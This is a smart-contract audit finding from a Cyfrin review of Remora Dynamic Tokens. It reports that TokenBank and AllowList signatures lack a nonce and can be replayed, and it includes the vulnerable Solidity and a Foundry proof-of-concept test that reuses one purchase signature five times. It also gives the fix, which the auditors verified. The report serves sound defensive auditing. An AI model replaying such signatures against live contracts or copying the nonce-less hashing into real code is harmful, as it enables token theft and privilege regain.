---
tags:
  - lang/solidity
  - sector/perpetuals
  - sector/stable
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - fix/use-reentrancy-guard
protocol: "[[Remora]]"
auditors:
  - "[[0xStalin]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md"
genome:
  - "[[missing-modifier]]"
  - "[[role-bypass]]"
  - "[[use-reentrancy-guard]]"
  - "[[permit-fork-replay]]"
  - "[[reentrancy-guard]]"
---
# Signatures on `TokenBank` and `AllowList` can be reused in perpetuity an infinite amount of times

- id: 63777
- impact: HIGH
- protocol: [[Remora]] Dynamic Tokens
- reporter: 0xStalin (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md

## Summary


The `TokenBank` contract allows buyers to purchase tokens by getting an off-chain signature. However, there is a bug in the contract where the `hash` of the signature does not include a `nonce` to prevent the same signature from being reused for multiple purchases. This means that buyers can reuse a signature to purchase infinite tokens without paying the cost. This same issue is present in the `AllowList` contract, where users can reuse signatures to regain their permissions if they are removed. To fix this issue, a `nonce` needs to be added to the hash that is signed. This bug has been fixed in the `Remora` project and verified by `Cyfrin`. 

## Details

**Description:** `TokenBank` allows buyers to purchase tokens by getting an off-chain signature, which specifies the token and the amount they are allowed to buy. When buying using a signature, the buyer doesn't have to pay on-chain for the purchase (As that is handled off-chain). The problem is that the `hash` of the signature doesn't include a `nonce` to prevent the same signature from being reused to process multiple purchases.
- The `hash` only includes the `investor`, `token`, and `amount`, which leads to the contract not being able to determine if a signature has already been used or not.
```solidity
//TokenBank.sol//
    // Handle payment off chain, including referral discount
    function buyTokenOCP(
        address signer,
        address tokenAddress,
        uint256 amount,
        bytes memory signature
    ) external nonReentrant {
        ...
        if (!verifySignature(signer, sender, tokenAddress, amount, signature))
            revert InvalidSignature();
        //@audit => No payment of stablecoin!
        _buyToken(address(0), sender, tokenAddress, amount, false);
    }

    function verifySignature(
        address signer,
        address investor,
        address token,
        uint256 amount,
        bytes memory signature
    ) internal view returns (bool result) {
//@audit-issue => No nonce on the hash of the signature
@>      bytes32 structHash = keccak256(
            abi.encode(
                BUY_TOKEN_TYPEHASH,
                investor,
                token,
                amount
        ));

        result = _verifySignature(signer, _hashTypedDataV4(structHash), signature);
    }

```

This same problem is present in the `AllowList` contract, which allows users to reuse signatures to regain their permissions if they are removed.

**Impact:** On `TokenBank`:
- Buyers can reuse signatures to purchase infinite tokens by paying the cost to obtain a single signature

On `AllowList`:
- user replays selfAllowUser signature to add themselves to the allow list again.
- A malicious admin who was removed as an admin can replay a signature after he was removed to re-enable themselves.

**Proof of Concept:** Add the next PoC to `TokenBankTest.t.sol`:
```solidity
    function test_cyfrin_buyTokenOCP_offchain_ReUseSignature() public {
        uint256 TOKENS_TO_PURCHASE = 1;
        _addCentralToTokenBank(60e6, true, 50_000);
        // seed inventory
        centralTokenProxy.mint(address(tokenBankProxy), uint64(5));
        address to = getDomesticUser(2);
        // register authorized signer in allowlist
        (address signer, uint256 sk) = makeAddrAndKey("BUY_SIGNER");
        bytes4[] memory asel = new bytes4[](1);
        asel[0] = bytes4(keccak256("addAuthorizedSigner(address)"));
        accessMgrProxy.setTargetFunctionRole(address(allowListProxy), asel, ADMIN_TOKEN_ID);
        accessMgrProxy.grantRole(ADMIN_TOKEN_ID, address(this), 0);
        allowListProxy.addAuthorizedSigner(signer);
        // build EIP-712 signature for BuyToken(investor, token, amount)
        bytes32 typeHash = keccak256("BuyToken(address investor, address token, uint256 amount)");
        bytes32 structHash = keccak256(abi.encode(typeHash, to, address(centralTokenProxy), TOKENS_TO_PURCHASE));
        bytes32 digest = MessageHashUtils.toTypedDataHash(tokenBankProxy.getDomainSeparator(), structHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(sk, digest);
        bytes memory sig = abi.encodePacked(r, s, v);
        vm.startPrank(to);
        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);
        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);
        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);
        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);
        tokenBankProxy.buyTokenOCP(signer, address(centralTokenProxy), TOKENS_TO_PURCHASE, sig);
        // to receives domestic child tokens
        assertEq(d_childTokenProxy.balanceOf(to), 5);
        vm.stopPrank();
    }

```

**Recommended Mitigation:** Consider adding a `nonce` to the hash that is signed. Refer to these articles to get more familiar with signature replay attacks
- [Mitigate Against Nonce Replay Attacks](https://www.remora-projects.io/blog/replay-attack-in-ethereum#mitigating-against-missing-nonce-replay-attacks)
- [Signature Replay Attacks](https://dacian.me/signature-replay-attacks#heading-missing-nonce-replay)

**Remora:** Fixed at commit [4f73c1d](https://github.com/remora-projects/remora-dynamic-tokens/commit/4f73c1de5e9b0beea6cdc0af3eb43bc4546ea203)

**Cyfrin:** Verified. A nonce has been added to the digestHash that is used to validate the signature.

\clearpage
